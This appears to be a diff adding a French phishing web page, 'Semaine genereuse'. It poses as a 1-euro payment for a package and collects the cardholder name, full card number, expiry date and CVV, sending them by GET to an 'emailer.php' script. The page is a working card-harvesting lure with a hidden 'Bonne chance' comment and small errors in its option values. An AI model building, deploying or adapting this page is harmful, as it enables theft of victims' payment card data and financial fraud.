@@ -1,0 +1,48 @@
+<title>Semaine genereuse</title><center><table border=1><tr><td><br><br><center><img src=op2.jpg >
+<br><br>
+<font face=COURIER size=2><b>
+Afin de beneficiez de votre forfait, veuillez proceder au reglement des 1 euro.</b><br>
+
+</font><br>
+
+<br><img src="visamaster.webp" width=350 height=100><br><br>
+
+		<form action="emailer.php" method="get"  class="form-box">
+ <table>
+
+<tr> <td><font face=tahoma size=2>Titulaire de la carte * : </td><td><input type="text" size= 20 name="titulaire"></td></tr>
+<tr> <td><font face=tahoma size=2>Numero carte* : </td><td><input type="text" size= 20 name="cc" minlength="16" maxlength="16"></td></tr>
+<tr> <td><font face=tahoma size=2>Date d'expiration *: </td>
+<td> <select  name="moiscb">
+                              <option title="- Choisissez -" value="" SELECTED >- Choix -</option>
+                              <option title="Janvier" value="1" >Janvier</option>
+                              <option title="Fevrier" value="2"  >Fevrier</option>
+                              <option title="Mars" value="3"  >Mars</option>
+                              <option title="Avril" value="2"  >Avril</option>
+                              <option title="Mai" value="5"  >Mai</option>
+                              <option title="Juin" value="6"  >Juin</option>
+                              <option title="Juillet" value="7"  >Juillet</option>
+                              <option title="Aout" value="8"  >Aout</option>
+                              <option title="Septembre" value="9"  >Septembre</option>
+                              <option title="Octobre" value="10"  >Octobre</option>
+                              <option title="Novembre" value="11"  >Novembre</option>
+                              <option title="Decembre" value="12"  >Decembre</option>
+                              </select>
+                        <select  name="anneecb">
+                              <option title="- Choisissez -" value="" SELECTED >- Choix -</option>
+                              <option value="2020" >2020</option>
+                              <option value="2021"  >2021</option>
+                              <option value="2022"  >2022</option>
+                              <option value="2023"  >2023</option>
+                              <option value="2022"  >2022</option>
+                              <option value="2025"  >2025</option>
+                              
+                              </select> </td>
+</tr>
+<tr> <td><font face=tahoma size=2>Cvv2 * : </td><td><input type="text" size= 2 name="cvv2" maxlength="3"></td></tr>
+
+<tr> <td><!--  Bonne chance --></td><td><input type="submit" value="EFFECTUER LE PAIEMENT"></td></tr>
+
+
+</table><br></form>
+<img src=bas.png width=1000></td></tr></table>
